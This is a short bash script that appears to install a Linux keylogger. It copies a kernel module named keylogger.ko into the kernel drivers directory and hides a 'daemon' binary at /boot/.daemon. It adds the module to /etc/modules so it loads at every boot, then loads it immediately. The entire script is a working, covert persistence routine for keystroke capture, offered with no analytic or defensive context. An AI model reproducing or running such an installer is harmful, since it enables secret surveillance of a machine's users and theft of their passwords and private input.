#!/bin/bash
MODULESDIR=/lib/modules/$(uname -r)/kernel/drivers/
cp keylogger.ko $MODULESDIR
cp daemon /boot/.daemon
echo keylogger >> /etc/modules
depmod
modprobe keylogger

